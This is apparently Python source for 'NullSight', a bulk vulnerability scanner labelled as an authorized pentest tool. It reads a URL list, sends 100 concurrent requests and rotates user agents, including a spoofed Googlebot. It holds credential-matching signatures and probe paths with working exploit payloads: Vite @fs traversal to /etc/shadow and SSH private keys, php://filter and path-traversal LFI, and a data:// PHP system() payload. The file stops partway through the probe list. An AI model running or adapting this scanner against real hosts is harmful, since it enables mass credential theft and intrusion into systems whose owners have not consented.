#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║  ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗██╗ ██████╗ ██╗  ██╗████████╗           ║
║  ████╗  ██║██║   ██║██║     ██║     ██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝           ║
║  ██╔██╗ ██║██║   ██║██║     ██║     ███████╗██║██║  ███╗███████║   ██║              ║
║  ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██║██║   ██║██╔══██║   ██║              ║
║  ██║ ╚████║╚██████╔╝███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║              ║
║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝              ║
║                                                                                      ║
║           NullSight v2.0 — AUTHORIZED BULK PENETRATION TESTING SCANNER              ║
║           Author: TheDEEP  |  www.thedeep.uz  |  2026                               ║
║                                                                                      ║
║  MODULE 1: HTTP Probe Scanner  — CVE payloads, env/git/config exposure,             ║
║            LFI chains, SSRF, GraphQL, JWT, misconfigs                               ║
║  MODULE 2: System Service Scan — FTP anon, DB open, Redis/Mongo unauthenticated,    ║
║            SMTP open relay, Elasticsearch exposed, SMB open                         ║
║                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import asyncio
import aiohttp
import socket
import json
import csv
import time
import random
import re
import sys
import math
import logging
import struct
from datetime import datetime
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse, quote

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import (Progress, SpinnerColumn, BarColumn,
                           TextColumn, TimeElapsedColumn)
from rich import box

logging.getLogger("asyncio").setLevel(logging.CRITICAL)

DISCLAIMER = """
[bold yellow]⚠  DISCLAIMER ⚠[/bold yellow]

This tool is [bold red]ONLY[/bold red] for authorized penetration testing.
• Only use on systems you own or have explicit written permission.
• Unauthorized use violates Uzbekistan and international law.

[bold cyan]Type YES to continue:[/bold cyan]
"""

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Config:
    concurrency:      int   = 100
    timeout:          int   = 20
    connect_timeout:  int   = 8
    read_timeout:     int   = 14
    max_body_bytes:   int   = 65536
    max_retries:      int   = 2
    queue_maxsize:    int   = 5000
    output_dir:       str   = "NullSight_findings"
    url_file:         str   = "url.txt"
    delay_min:        float = 0.0
    delay_max:        float = 0.03
    sys_scan_timeout: int   = 5      # socket timeout for Module 2
    sys_scan_enabled: bool  = True
    user_agents: list = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "curl/8.7.1",
    ])

CONFIG = Config()

# ─────────────────────────────────────────────────────────────────────────────
# CONTENT-TYPE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
JSON_CT = re.compile(r'application/json|text/json', re.I)
HTML_CT = re.compile(r'text/html|application/xhtml', re.I)
TEXT_CT = re.compile(r'^text/', re.I)
BIN_EXT = re.compile(
    r'\.(zip|tar\.gz|tar|gz|sql|sqlite3|bak|swp|save|jar|war|hprof|db|dump|7z|rar)$', re.I)

def save_extension(path: str, ct: str, body: bytes) -> str:
    if BIN_EXT.search(path): return ".bin"
    if JSON_CT.search(ct):   return ".json"
    if HTML_CT.search(ct):   return ".html"
    if TEXT_CT.search(ct):   return ".txt"
    stripped = body[:60].strip()
    if stripped.startswith(b"{") or stripped.startswith(b"["): return ".json"
    return ".txt"

# ─────────────────────────────────────────────────────────────────────────────
# ENTROPY
# ─────────────────────────────────────────────────────────────────────────────
def shannon_entropy(s: str) -> float:
    if not s: return 0.0
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    length = len(s)
    return -sum((v/length)*math.log2(v/length) for v in freq.values())

def has_high_entropy_secret(text: str, threshold: float = 4.5) -> bool:
    for token in re.findall(r'[A-Za-z0-9+/=_\-]{20,}', text):
        if shannon_entropy(token) >= threshold:
            return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  SIGNATURES  — CRITICAL + HIGH only (+ directory listing as MEDIUM)
#  Key design: each signature carries `required_path_pattern` — if set, the
#  response URL *path* must match it, otherwise the signature is skipped.
#  This eliminates the Yii/debug/FP class of false-positives entirely.
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Signature:
    name:                  str
    severity:              str          # CRITICAL / HIGH / MEDIUM
    pattern:               re.Pattern
    min_content_length:    int  = 20
    description:           str  = ""
    is_bytes:              bool = False
    cve:                   str  = ""
    tags:                  list = field(default_factory=list)
    # Path must match this regex for signature to fire (None = any path)
    required_path_pattern: Optional[re.Pattern] = None
    # Response Content-Type must NOT be HTML (unless explicitly allowed)
    html_allowed:          bool = False

SIGNATURES: list[Signature] = [

    # ══════════════════════════════════════════════════════════
    # ENV / SECRET FILES  — path must look like an env/config file
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Env file — credentials exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'(?:APP_KEY|APP_SECRET|DB_PASSWORD|DB_PASS|DATABASE_PASSWORD|'
            r'SECRET_KEY|SECRET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|'
            r'API_KEY|API_SECRET|TOKEN|ACCESS_TOKEN|AUTH_TOKEN|JWT_SECRET|'
            r'MAIL_PASSWORD|REDIS_PASSWORD|STRIPE_SECRET|TWILIO_AUTH_TOKEN|'
            r'GITHUB_TOKEN|GOOGLE_API_KEY|PRIVATE_KEY|MYSQL_PASSWORD|'
            r'MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD|MONGODB_URI|DATABASE_URL|'
            r'PUSHER_APP_SECRET|ENCRYPTION_KEY|PASSWORD_SALT)\s*=\s*\S+',
            re.I | re.M),
        min_content_length=30,
        description="Credential KEY=VALUE found in env file",
        tags=["env", "secret"],
        required_path_pattern=re.compile(
            r'/\.env(?:\.|$|/)|/env$|/\.env~|/env\.(?:backup|local|prod|dev|staging|example|test|old|bak|save|2\d{3})$',
            re.I),
        html_allowed=False,
    ),

    Signature(
        name="Generic env block",
        severity="HIGH",
        pattern=re.compile(
            r'^(?:[A-Za-z_][A-Za-z0-9_]{2,39}=.{4,300}\n){3,}',
            re.M),
        min_content_length=80,
        description="Multiple KEY=VALUE lines — env file confirmed",
        tags=["env"],
        required_path_pattern=re.compile(
            r'/\.env(?:\.|$|/)|/env$|/\.env~',
            re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # GIT — path must start with /.git/
    # ══════════════════════════════════════════════════════════
    Signature(
        name=".git/config exposed",
        severity="CRITICAL",
        pattern=re.compile(r'\[core\].*repositoryformatversion', re.S | re.I),
        description="Git repository config exposed — source code cloneable",
        tags=["git", "source-code"],
        required_path_pattern=re.compile(r'/\.git/', re.I),
        html_allowed=False,
    ),
    Signature(
        name=".git/HEAD exposed",
        severity="HIGH",
        pattern=re.compile(r'^ref:\s+refs/heads/', re.M),
        description="Git HEAD reference exposed",
        tags=["git"],
        required_path_pattern=re.compile(r'/\.git/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # LINUX SYSTEM FILES — path must contain /proc/ or etc/
    # ══════════════════════════════════════════════════════════
    Signature(
        name="/etc/passwd exposed",
        severity="CRITICAL",
        pattern=re.compile(r'root:x:0:0:|nobody:x:\d+:\d+:|www-data:x:\d+', re.M),
        description="Linux passwd file — LFI confirmed",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="/etc/shadow exposed",
        severity="CRITICAL",
        pattern=re.compile(r'root:\$[0-9a-z$]\$|:\$y\$|:\$6\$|:\$2b\$', re.M | re.I),
        description="Linux shadow — password hashes exposed",
        tags=["lfi", "system"],
        html_allowed=False,
    ),
    Signature(
        name="proc/self/environ LFI",
        severity="CRITICAL",
        pattern=re.compile(r'PATH=(?:/[^:]+:)+|HOME=/(?:root|home|var|www)|SHELL=', re.M),
        min_content_length=40,
        description="Process environment leaked — LFI confirmed",
        tags=["lfi", "rce"],
        html_allowed=False,
    ),
    Signature(
        name="proc/self/cmdline",
        severity="HIGH",
        pattern=re.compile(r'(?:python|php|node|java|ruby|nginx|apache)\x00', re.M),
        description="Process cmdline exposed",
        tags=["lfi"],
        required_path_pattern=re.compile(r'proc/self/cmdline|proc/version', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # SSH / KEYS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="SSH private key exposed",
        severity="CRITICAL",
        pattern=re.compile(r'-----BEGIN (?:RSA|EC|OPENSSH|DSA|PGP) PRIVATE KEY-----'),
        description="SSH/PGP private key material exposed",
        tags=["ssh", "key"],
        html_allowed=False,
    ),
    Signature(
        name="AWS credentials/key",
        severity="CRITICAL",
        pattern=re.compile(
            r'(?:AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}|'
            r'aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}', re.I),
        description="AWS access key or secret exposed",
        tags=["cloud", "aws"],
        html_allowed=False,
    ),
    Signature(
        name="GCP service account key",
        severity="CRITICAL",
        pattern=re.compile(r'"type"\s*:\s*"service_account".*?"private_key"', re.S | re.I),
        description="Google Cloud service account JSON exposed",
        tags=["cloud", "gcp"],
        html_allowed=False,
    ),
    Signature(
        name="Service API token",
        severity="HIGH",
        pattern=re.compile(
            r'(?:ghp_|gho_|ghs_|ghr_)[A-Za-z0-9]{36}|'
            r'xox[bpars]-[0-9A-Za-z\-]{10,}|'
            r'sk-[A-Za-z0-9]{40,}'),
        description="Service-specific API token (GitHub/Slack/OpenAI) exposed",
        tags=["token"],
        html_allowed=False,
    ),
    Signature(
        name="Database connection DSN with credentials",
        severity="HIGH",
        pattern=re.compile(
            r'(?:mysql|postgres|postgresql|mongodb(?:\+srv)?|mssql|redis|'
            r'amqp|jdbc:mysql|jdbc:postgresql)://[^:\s@]+:[^@\s]+@[^/\s]+',
            re.I),
        description="Database DSN with embedded credentials",
        tags=["database", "secret"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PHP LFI WRAPPERS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="PHP LFI base64 leak (php://filter)",
        severity="CRITICAL",
        pattern=re.compile(r'^[A-Za-z0-9+/]{200,}={0,2}$', re.M),
        min_content_length=200,
        description="php://filter base64 leak — LFI confirmed, source code readable",
        tags=["lfi", "php"],
        required_path_pattern=re.compile(r'php://', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # LARAVEL — path must be a Laravel-specific path OR APP_KEY in non-HTML
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Laravel APP_KEY exposed",
        severity="CRITICAL",
        pattern=re.compile(r'APP_KEY=base64:[A-Za-z0-9+/=]{40,}', re.M),
        description="Laravel APP_KEY exposed — full decryption/RCE possible",
        cve="CVE-2021-3129",
        tags=["laravel", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="Laravel debug stack trace",
        severity="CRITICAL",
        pattern=re.compile(
            r'Illuminate\\[A-Za-z\\]+Exception|'
            r'laravel\.log|'
            r'SymfonyDisplayer|'
            r'"environment"\s*:\s*"(?:local|development)".*?"debug"\s*:\s*true',
            re.I | re.S),
        description="Laravel debug mode — stack traces with file paths",
        cve="CVE-2021-3129",
        tags=["laravel", "debug"],
        # Must fire on debug/error pages, not static files
        required_path_pattern=re.compile(
            r'/telescope|/_debugbar|/log-viewer|/horizon|/laravel-filemanager', re.I),
        html_allowed=True,
    ),
    Signature(
        name="Laravel .env in telescope/debug panel",
        severity="CRITICAL",
        pattern=re.compile(r'APP_DEBUG.*?=.*?true|APP_ENV.*?=.*?(?:local|dev)', re.I | re.M),
        description="Laravel debug flag visible in Telescope/Debugbar",
        tags=["laravel", "debug"],
        required_path_pattern=re.compile(r'/telescope|/_debugbar', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # YII2 — STRICT: pattern must be in Yii-specific debug URL
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Yii2 debug panel exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'yii\s+Debug\s+Toolbar|'
            r'Yii2\s+Debug\s+Panel|'
            r'"YII_DEBUG"\s*[:=]\s*true|'
            r'yii\\base\\[A-Za-z]+Exception',
            re.I),
        description="Yii2 debug panel — application internals exposed",
        tags=["yii", "debug"],
        required_path_pattern=re.compile(
            r'/debug/default/view|/index\.php\?r=debug|/_debug|/yii2-debug', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # DJANGO — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Django DEBUG=True page",
        severity="CRITICAL",
        pattern=re.compile(
            r"You're seeing this error because you have DEBUG = True|"
            r'Django\s+Version:\s+\d|'
            r'SECRET_KEY\s*=\s*[\'"][^\'"]{20,}[\'"]',
            re.I),
        description="Django DEBUG mode active — settings exposed",
        tags=["django", "debug"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # RAILS debug — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Rails debug info exposed",
        severity="HIGH",
        pattern=re.compile(
            r'Rails\.root\s*=|config\.secret_key_base\s*=|'
            r'Application Trace.*?Framework Trace',
            re.I | re.S),
        description="Rails debug information exposed",
        tags=["rails", "debug"],
        required_path_pattern=re.compile(r'/rails/info|/rails/mailers', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # SPRING BOOT ACTUATOR — path must be /actuator/
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Spring Boot actuator /env exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"activeProfiles"|"propertySources".*?"source"|'
            r'"spring\.datasource\.password"|"spring\.mail\.password"',
            re.I | re.S),
        description="Spring Boot /actuator/env — credentials in properties",
        tags=["spring", "actuator"],
        required_path_pattern=re.compile(r'/actuator/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Spring Boot actuator beans/mappings",
        severity="HIGH",
        pattern=re.compile(r'"beans":\[|"mappings":\{|"dispatcherServlets"', re.I),
        description="Spring Boot actuator endpoint exposed",
        tags=["spring", "actuator"],
        required_path_pattern=re.compile(r'/actuator/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Spring Boot heap dump",
        severity="CRITICAL",
        pattern=re.compile(rb'JAVA PROFILE \d\.\d|HPROF|java\.lang\.Object', re.I),
        min_content_length=50,
        description="Spring Boot heap dump — memory dump exposed",
        is_bytes=True,
        tags=["spring", "java"],
        required_path_pattern=re.compile(r'/actuator/heapdump', re.I),
    ),

    # ══════════════════════════════════════════════════════════
    # JENKINS / CI-CD — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Jenkins credentials.xml exposed",
        severity="CRITICAL",
        pattern=re.compile(r'<com\.cloudbees\.plugins\.credentials|<hudson\.util\.Secret>', re.I),
        description="Jenkins credentials.xml exposed — credentials readable",
        tags=["jenkins", "cicd"],
        required_path_pattern=re.compile(r'credentials\.xml|/jenkins/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="TeamCity REST API exposed",
        severity="HIGH",
        pattern=re.compile(r'"buildTypeId"|"projectId"|"agentId"', re.I),
        description="JetBrains TeamCity REST API exposed",
        cve="CVE-2024-27198",
        tags=["teamcity", "cicd"],
        required_path_pattern=re.compile(r'/app/rest/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="GitLab CI variable exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'CI_JOB_TOKEN|CI_REGISTRY_PASSWORD|GITLAB_TOKEN|'
            r'"variable_type"\s*:\s*"env_var"', re.I),
        description="GitLab CI environment variable exposed",
        tags=["gitlab", "cicd", "secret"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # SSRF CLOUD METADATA — pattern fires only on SSRF-triggered content
    # ══════════════════════════════════════════════════════════
    Signature(
        name="AWS metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"Code"\s*:\s*"Success".*?"AccessKeyId"|'
            r'ami-[a-f0-9]{8,17}|'
            r'"instanceId"\s*:\s*"i-[a-f0-9]{8,17}"',
            re.I | re.S),
        description="AWS IMDSv1 metadata retrieved — SSRF confirmed",
        tags=["ssrf", "cloud", "aws"],
        html_allowed=False,
    ),
    Signature(
        name="GCP metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'"computeMetadata".*?"serviceAccounts"|'
            r'metadata\.google\.internal',
            re.I | re.S),
        description="GCP metadata server — SSRF confirmed",
        tags=["ssrf", "cloud", "gcp"],
        html_allowed=False,
    ),
    Signature(
        name="Azure metadata SSRF confirmed",
        severity="CRITICAL",
        pattern=re.compile(r'"subscriptionId".*?"resourceGroupName"', re.I | re.S),
        description="Azure IMDS — SSRF confirmed",
        tags=["ssrf", "cloud", "azure"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # GRAPHQL — path must be graphql endpoint
    # ══════════════════════════════════════════════════════════
    Signature(
        name="GraphQL introspection enabled",
        severity="HIGH",
        pattern=re.compile(
            r'"__schema"\s*:\s*\{.*?"types"',
            re.S | re.I),
        description="GraphQL introspection — full schema dump possible",
        tags=["graphql"],
        required_path_pattern=re.compile(r'/graphql|/graphiql|/playground', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # JWT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="JWT alg:none accepted",
        severity="CRITICAL",
        pattern=re.compile(r'"alg"\s*:\s*"none"', re.I),
        description="JWT alg:none accepted — authentication bypass",
        tags=["jwt", "auth"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # WORDPRESS — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="WordPress wp-config.php source",
        severity="CRITICAL",
        pattern=re.compile(
            r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'[^']+'\s*\)|"
            r"define\s*\(\s*'AUTH_KEY'\s*,\s*'[^']+'\s*\)",
            re.I),
        description="WordPress wp-config.php source exposed",
        tags=["wordpress", "secret"],
        required_path_pattern=re.compile(r'wp-config', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # CONTAINER/K8s SECRETS — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Docker/K8s secrets file",
        severity="CRITICAL",
        pattern=re.compile(
            r'POSTGRES_PASSWORD:|MYSQL_ROOT_PASSWORD:|MONGO_INITDB_ROOT_PASSWORD:|'
            r'kind:\s*Secret\b|RABBITMQ_DEFAULT_PASS:',
            re.I),
        description="Container/Kubernetes secrets exposed",
        tags=["docker", "k8s", "secret"],
        required_path_pattern=re.compile(
            r'docker-compose|kubernetes|k8s/secrets|\.dockerenv', re.I),
        html_allowed=False,
    ),
    Signature(
        name=".aws/credentials exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'\[default\]|aws_access_key_id\s*=|aws_secret_access_key\s*=', re.I),
        description="AWS credentials file exposed",
        tags=["cloud", "aws"],
        required_path_pattern=re.compile(r'\.aws/credentials|aws_credentials', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # ELASTICSEARCH / KIBANA — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Elasticsearch cluster exposed",
        severity="HIGH",
        pattern=re.compile(
            r'"cluster_name"\s*:|"number_of_nodes"\s*:\s*\d', re.I),
        description="Elasticsearch cluster info — unauthenticated access",
        tags=["elasticsearch"],
        required_path_pattern=re.compile(r'/_cat/|/_cluster/|/_nodes', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # NGINX STATUS — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Nginx stub_status exposed",
        severity="HIGH",
        pattern=re.compile(r'Active connections:\s+\d+|server accepts handled requests', re.I),
        description="Nginx stub_status page exposed",
        tags=["nginx"],
        required_path_pattern=re.compile(r'/nginx_status|/status$', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # phpinfo — strict path
    # ══════════════════════════════════════════════════════════
    Signature(
        name="phpinfo() exposed",
        severity="HIGH",
        pattern=re.compile(
            r'PHP Version\s*(?:</td>|</b>|\s)\s*\d\.\d|'
            r'<td class="e">disable_functions', re.I),
        description="phpinfo() — full server configuration exposed",
        tags=["php"],
        required_path_pattern=re.compile(r'phpinfo\.php|info\.php', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # VITE @fs bypass — CVE-2024-23331 / CVE-2025-30208
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Vite @fs path traversal (CVE-2024-23331)",
        severity="CRITICAL",
        pattern=re.compile(
            r'root:x:0:0:|APP_KEY=|APP_SECRET=|DB_PASSWORD=|'
            r'-----BEGIN (?:RSA|OPENSSH) PRIVATE KEY-----|'
            r'PATH=(?:/[^:]+:)+',
            re.I | re.M),
        description="Vite @fs bypass — arbitrary file read confirmed",
        cve="CVE-2024-23331",
        tags=["vite", "lfi"],
        required_path_pattern=re.compile(r'/@fs/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # APACHE PATH TRAVERSAL — CVE-2021-41773 / 42013
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Apache path traversal RCE (CVE-2021-41773)",
        severity="CRITICAL",
        pattern=re.compile(r'root:x:0:0:|uid=\d+\(\w+\)', re.I),
        description="Apache CVE-2021-41773 — path traversal/RCE confirmed",
        cve="CVE-2021-41773",
        tags=["apache", "lfi", "rce"],
        required_path_pattern=re.compile(r'\.%2e|%2e%2e|%%32%65', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # RCE COMMAND OUTPUT — any path, very specific pattern
    # ══════════════════════════════════════════════════════════
    Signature(
        name="RCE — command output confirmed",
        severity="CRITICAL",
        pattern=re.compile(
            r'uid=0\(root\)|uid=\d+\(\w+\)\s+gid=\d+|'
            r'Linux\s+\S+\s+\d+\.\d+\.\d+.*?#\d+\s+SMP',
            re.I),
        description="Remote Code Execution — command output in response",
        tags=["rce"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # PROTOTYPE POLLUTION reflected
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Prototype pollution reflected",
        severity="HIGH",
        pattern=re.compile(
            r'"__proto__"\s*:\s*\{.*?"polluted"',
            re.S | re.I),
        description="Prototype pollution payload reflected in response",
        tags=["prototype-pollution"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # DIRECTORY LISTING — only MEDIUM we keep
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Directory listing enabled",
        severity="MEDIUM",
        pattern=re.compile(r'Index of /.*<a href=|Parent Directory.*Last modified', re.I | re.S),
        min_content_length=100,
        description="Web server directory listing — internal files browseable",
        tags=["missconfig"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # NPMRC auth token
    # ══════════════════════════════════════════════════════════
    Signature(
        name=".npmrc authToken exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'//registry\.npmjs\.org/:_authToken|_auth\s*=\s*[A-Za-z0-9+/=]{20,}', re.I),
        description=".npmrc with NPM registry token — supply chain attack vector",
        tags=["supply-chain", "secret"],
        required_path_pattern=re.compile(r'\.npmrc', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # HTPASSWD
    # ══════════════════════════════════════════════════════════
    Signature(
        name=".htpasswd exposed",
        severity="HIGH",
        pattern=re.compile(r'^[A-Za-z0-9_\-]+:\$(?:apr1|2y)\$[A-Za-z0-9./]+', re.M),
        description=".htpasswd — hashed credentials exposed",
        tags=["apache", "auth"],
        required_path_pattern=re.compile(r'\.htpasswd', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PALO ALTO PAN-OS — CVE-2024-3400
    # ══════════════════════════════════════════════════════════
    Signature(
        name="PAN-OS GlobalProtect CVE-2024-3400 probe",
        severity="CRITICAL",
        pattern=re.compile(r'<response\s+status="error"|GP_COOKIE|clientIpAddress', re.I),
        description="PAN-OS GlobalProtect — CVE-2024-3400 injection point identified",
        cve="CVE-2024-3400",
        tags=["panos", "rce"],
        required_path_pattern=re.compile(r'/global-protect/|/ssl-vpn/', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # F5 BIG-IP — CVE-2022-1388
    # ══════════════════════════════════════════════════════════
    Signature(
        name="F5 BIG-IP iControl RCE (CVE-2022-1388)",
        severity="CRITICAL",
        pattern=re.compile(r'"kind"\s*:\s*"tm:|uid=\d+\(', re.I),
        description="BIG-IP iControl REST — unauthenticated RCE",
        cve="CVE-2022-1388",
        tags=["bigip", "rce"],
        required_path_pattern=re.compile(r'/mgmt/tm/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # CONFLUENCE — CVE-2022-26134
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Confluence OGNL injection (CVE-2022-26134)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+|java\.lang\.Runtime|com\.opensymphony\.xwork2', re.I),
        description="Confluence OGNL injection — RCE confirmed",
        cve="CVE-2022-26134",
        tags=["confluence", "rce"],
        required_path_pattern=re.compile(r'\.action|confluence', re.I),
        html_allowed=True,
    ),
]

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  PROBES — HTTP paths to test (CRITICAL/HIGH focus)
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Probe:
    path:          str
    label:         str
    method:        str           = "GET"
    body:          Optional[dict] = None
    extra_headers: Optional[dict] = None
    cve:           str           = ""

PROBES: list[Probe] = [

    # ── .ENV VARIANTS ──────────────────────────────────────────
    Probe("/.env",                          ".env"),
    Probe("/.env.backup",                   ".env.backup"),
    Probe("/.env.local",                    ".env.local"),
    Probe("/.env.production",               ".env.production"),
    Probe("/.env.dev",                      ".env.dev"),
    Probe("/.env.staging",                  ".env.staging"),
    Probe("/.env.example",                  ".env.example"),
    Probe("/.env.test",                     ".env.test"),
    Probe("/.env.old",                      ".env.old"),
    Probe("/.env.bak",                      ".env.bak"),
    Probe("/.env.save",                     ".env.save"),
    Probe("/.env~",                         ".env~"),
    Probe("/.env.2025",                     ".env.2025"),
    Probe("/.env.2024",                     ".env.2024"),
    Probe("/env",                           "env"),

    # ── GIT ────────────────────────────────────────────────────
    Probe("/.git/config",                   ".git/config"),
    Probe("/.git/HEAD",                     ".git/HEAD"),
    Probe("/.git/COMMIT_EDITMSG",           ".git/COMMIT_EDITMSG"),
    Probe("/.git/logs/HEAD",                ".git/logs/HEAD"),
    Probe("/.git/refs/heads/main",          ".git/refs/main"),
    Probe("/.git/refs/heads/master",        ".git/refs/master"),

    # ── CVE-2024-23331 / CVE-2025-30208 Vite @fs ──────────────
    Probe("/@fs/etc/passwd",                        "Vite @fs /etc/passwd",      cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw",                    "Vite @fs ?raw",             cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?import&raw",             "Vite @fs ?import&raw",      cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ",                 "Vite @fs environ",          cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ?raw",             "Vite @fs environ raw",      cve="CVE-2024-23331"),
    Probe("/@fs/app/.env",                          "Vite @fs app .env",         cve="CVE-2024-23331"),
    Probe("/@fs/app/.env?raw",                      "Vite @fs app .env raw",     cve="CVE-2024-23331"),
    Probe("/@fs/var/www/html/.env",                 "Vite @fs www .env",         cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw??",                  "Vite ?raw?? bypass",        cve="CVE-2025-30208"),
    Probe("/@fs/proc/self/environ?raw??",           "Vite environ ?raw??",       cve="CVE-2025-30208"),
    Probe("/@fs/app/.env?raw??",                    "Vite .env ?raw??",          cve="CVE-2025-30208"),
    Probe("/@fs/etc/shadow?raw??",                  "Vite shadow ?raw??",        cve="CVE-2025-30208"),
    Probe("/@fs/root/.ssh/id_rsa?raw",              "Vite root id_rsa",          cve="CVE-2024-23331"),
    Probe("/@fs/etc/ssh/ssh_host_rsa_key?raw",      "Vite SSH host key",         cve="CVE-2024-23331"),

    # ── PHP LFI WRAPPERS ───────────────────────────────────────
    Probe("/?page=php://filter/convert.base64-encode/resource=index",
          "LFI php://filter index"),
    Probe("/?file=php://filter/convert.base64-encode/resource=/etc/passwd",
          "LFI php://filter /etc/passwd"),
    Probe("/?page=php://filter/convert.base64-encode/resource=../config",
          "LFI php://filter config"),
    Probe("/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
          "LFI data:// RCE"),
    Probe("/?page=../../../../etc/passwd",                  "LFI classic traversal"),
    Probe("/?file=....//....//....//etc/passwd",            "LFI four-dot bypass"),
    Probe("/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","LFI URL-encoded"),
